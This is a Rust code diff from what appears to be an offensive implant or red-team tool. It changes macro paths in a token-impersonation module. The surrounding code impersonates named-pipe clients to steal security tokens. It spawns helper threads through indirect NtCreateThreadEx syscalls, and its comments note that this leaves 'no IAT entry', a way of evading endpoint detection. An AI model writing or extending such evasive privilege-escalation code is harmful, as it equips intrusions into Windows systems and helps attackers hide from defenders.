@@ -279,7 +279,7 @@ impl Drop for CachedToken {
         // means it was never opened or already closed.
         let h = self.handle as usize;
         if h != 0 && h != usize::MAX {
-            let _ = syscall!("NtClose", h as u64);
+            let _ = crate::syscall!("NtClose", h as u64);
             log::trace!("token_impersonation: Closed cached token handle {h:#x} via Drop");
         }
     }
@@ -369,7 +369,7 @@ fn nt_close_handle(handle: HANDLE) {
     if handle.is_null() || handle as usize == usize::MAX {
         return;
     }
-    let _ = syscall!("NtClose", handle as u64);
+    let _ = crate::syscall!("NtClose", handle as u64);
 }
 
 /// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
@@ -707,7 +707,7 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
     // Spawn the helper thread via NtCreateThreadEx (indirect syscall, no IAT entry).
     let mut thread_handle: usize = 0;
     let create_status = unsafe {
-        syscall!(
+        crate::syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as u64,
             THREAD_WAIT_ACCESS,                         // minimal thread access
@@ -728,7 +728,7 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
     // Wait for the helper thread to complete via NtWaitForSingleObject.
     let timeout_100ns: i64 = -((PIPE_TIMEOUT_MS as i64) * 10_000);
     let wait_result = unsafe {
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtWaitForSingleObject",
             thread_handle as u64,
             0u64,
@@ -741,12 +741,12 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
         }
     };
     if wait_result != WAIT_OBJECT_0 {
-        let _ = syscall!("NtClose", thread_handle as u64);
+        let _ = crate::syscall!("NtClose", thread_handle as u64);
         return Err(anyhow!("impersonation helper thread timed out (SetThreadToken path)"));
     }
 
     if !ctx.success.load(Ordering::Acquire) {
-        let _ = syscall!("NtClose", thread_handle as u64);
+        let _ = crate::syscall!("NtClose", thread_handle as u64);
         return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread (SetThreadToken path)"));
     }
 
@@ -762,7 +762,7 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
-    let _ = syscall!("NtClose", thread_handle as u64);
+    let _ = crate::syscall!("NtClose", thread_handle as u64);
     drop(ctx);
 
     // Query user/domain from the duplicated token.
@@ -826,7 +826,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
     // Spawn the helper thread via NtCreateThreadEx (indirect syscall, no IAT entry).
     let mut thread_handle: usize = 0;
     let create_status = unsafe {
-        syscall!(
+        crate::syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as u64, // ThreadHandle
             THREAD_WAIT_ACCESS,                         // DesiredAccess (minimal)
@@ -850,7 +850,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
     // Wait for the helper thread via NtWaitForSingleObject (indirect syscall).
     let timeout_100ns: i64 = -((PIPE_TIMEOUT_MS as i64) * 10_000);
     let wait_result = unsafe {
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtWaitForSingleObject",
             thread_handle as u64,
             0u64, // Alertable = FALSE
@@ -863,12 +863,12 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
         }
     };
     if wait_result != WAIT_OBJECT_0 {
-        let _ = syscall!("NtClose", thread_handle as u64);
+        let _ = crate::syscall!("NtClose", thread_handle as u64);
         return Err(anyhow!("impersonation helper thread timed out or failed"));
     }
 
     if !ctx.success.load(Ordering::Acquire) {
-        let _ = syscall!("NtClose", thread_handle as u64);
+        let _ = crate::syscall!("NtClose", thread_handle as u64);
         return Err(anyhow!("ImpersonateNamedPipeClient failed in helper thread"));
     }
 
@@ -886,7 +886,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
-    let _ = syscall!("NtClose", thread_handle as u64);
+    let _ = crate::syscall!("NtClose", thread_handle as u64);
     drop(ctx); // Clean up the boxed context.
 
     // Query user/domain.
